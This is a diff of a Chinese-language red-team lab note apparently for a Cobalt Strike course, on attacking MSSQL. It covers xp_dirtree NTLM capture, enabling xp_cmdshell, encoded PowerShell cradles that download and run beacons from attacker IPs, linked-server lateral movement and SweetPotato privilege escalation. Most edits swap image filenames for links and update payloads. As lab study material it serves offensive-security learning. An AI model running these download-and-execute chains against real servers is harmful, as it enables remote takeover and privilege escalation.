@@ -213,7 +213,8 @@ EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 
 收到net NTLM哈希
 
-1660955764190.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660955764190.png)
 
 
 等价方法，可以使用WinDivert + rportfwd的组合，参考relay那章，在kali上接受上面的net NTLM哈希
@@ -245,7 +246,8 @@ dev\svc_mssql
 SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
 ```
 
-1660956195011.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956195011.png)
 
 0=没有权限，1=有权限
 
@@ -256,7 +258,8 @@ sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell'
 
 现在可以执行命令
 
-1660956339358.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956339358.png)
 
 
 ## 利用mssql执行命令的权限返回一个shell
@@ -270,17 +273,18 @@ rportfwd 8080 10.10.5.120 80
 
 2. 做一个pivot listener
 
-1660956769959.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956769959.png)
 
 配置
 
-1660956854183.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956854183.png)
 
 3. 使用上面的listener做一个攻击payload
 
-1660956941305.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956941305.png)
 
 生成payload
 ```
@@ -318,8 +322,8 @@ EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBl
 
 收到反弹的beacon
 
-1660957434664.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957434664.png)
 
 # MS SQL Lateral Movement
 
@@ -328,14 +332,16 @@ EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBl
 SELECT * FROM master..sysservers;
 ```
 
-1660957799421.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957799421.png)
 
 根据实例执行命令
 ```
 SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
 ```
 
-1660957846477.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957846477.png)
 
 
 查看在这个实例上是否有执行命令的能力
@@ -343,7 +349,8 @@ SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
 SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
 ```
 
-1660957909630.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957909630.png)
 
 值=1，可以执行命令
 
@@ -396,61 +403,117 @@ Links       :
 
 
 
-对sql-1.cyberbotic.io这个实例反弹回一个shell,依然使用上面的加密命令
+## 对sql-1.cyberbotic.io这个实例反弹回一个shell,依然使用上面的加密命令
 ```
 SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA''' )
 ```
 
-1660958218908.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660958218908.png)
 
 
 
-对sql01.zeropointsecurity.local这个实例反弹回一个shell
+## 对sql01.zeropointsecurity.local这个实例反弹回一个shell
 
-这里注意zeropointsecurity.local是不能直接跟靶机通信的
+这里注意zeropointsecurity.local是不能直接跟靶机通信的,必须以sql-1.cyberbotic.io做一个pivot
 
 在sql-1做一个转发
 ```
-rportfwd 8080 10.10.17.231 8080
+rportfwd 8080 10.10.5.120 8080
 ```
 
 在sql-1做一个lisener
 
-1660959095996.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661064830268.png)
 
 生成一句话payload
 
-1660959212159.png
-
 ```
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/s1'))"
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/sql1'))"
 ```
-
 
 
 把上面双引号里面的内容单独截取
 ```
-IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/s1'))
+IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/sql1'))
 ```
 
-换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.17.231:8080
+换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.15.90:8080
+
+
 ```
-IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/s1"))
+IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/sql1"))
 ```
 
 使用powershell encode上面的字符串
 
 ```
-PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/s1"))'
+PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/sql1"))'
 PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
-SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwAxACIAKQApAA==
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA=
+```
+
+执行
+```
+SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA='''' '')' )
 ```
 
 
+拿到sql01.zeropointsecurity.local的beacon
 
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661065278050.png)
+
+
+# MS SQL Privilege Escalation
+
+在sql01，返回的shell不是system权限
 
 ```
-SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwAxACIAKQApAA=='''' '')' )
+beacon> getuid
+[*] Tasked beacon to get userid
+[+] host called home, sent: 8 bytes
+[*] You are NT Service\MSSQL$SQLEXPRESS
+beacon> shell hostname
+[*] Tasked beacon to run: hostname
+[+] host called home, sent: 39 bytes
+[+] received output:
+sql01
+
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
+[*] Tasked beacon to run .NET program: Seatbelt.exe TokenPrivileges
+[+] host called home, sent: 775753 bytes
+[+] received output:
+
+====== TokenPrivileges ======
+
+Current Token's Privileges
+
+                SeAssignPrimaryTokenPrivilege:  DISABLED
+                     SeIncreaseQuotaPrivilege:  DISABLED
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
+                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+
 ```
+
+开启了```SeImpersonatePrivilege```能力
+
+可以用烂土豆提权，这个在OSCP做过很多，不多解释
+
+加密payload依然使用上面生成的rev shell，其实这里就是模拟system的token执行一个powershell
+```
+execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA="
+```
+
+执行以后返回一个system的beacon
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661066023303.png)
+
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661066137416.png)
